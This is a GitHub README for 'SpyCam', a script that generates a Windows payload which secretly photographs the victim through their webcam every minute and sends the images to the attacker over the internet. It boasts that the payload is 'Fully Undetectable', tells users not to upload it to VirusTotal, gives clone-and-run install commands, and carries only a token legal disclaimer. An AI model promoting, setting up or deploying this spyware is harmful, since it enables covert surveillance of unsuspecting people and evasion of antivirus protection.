# SpyCam v1.0
## Author: github.com/thelinuxchoice/spycam
## IG: instagram.com/linux_choice
### Don't copy this code without give me the credits, nerd! 

Script to generate a Win32 payload that takes the webcam image every 1 minute and send it to the attacker

![sc](https://user-images.githubusercontent.com/34893261/50187876-a980fa00-0306-11e9-9a87-0ac4e649ea88.png)

### Features:
### Takes the webcam image every 1 minute
### Works on WAN: Port Forwarding by Serveo.net
### Fully Undetectable (FUD) -> Don't Upload to virustotal.com!

### SpyCam uses CommandCam by Ted Burke ( https://github.com/tedburke/CommandCam )

## Legal disclaimer:

Usage of SpyCam for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

### Usage:
```
git clone https://github.com/thelinuxchoice/spycam
cd spycam
bash install.sh
chmod +x spycam
./spycam
```

### Donate!
Support the authors:
### Paypal:
https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=CLKRT5QXXFJY4&source=url
### LiberaPay:
<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
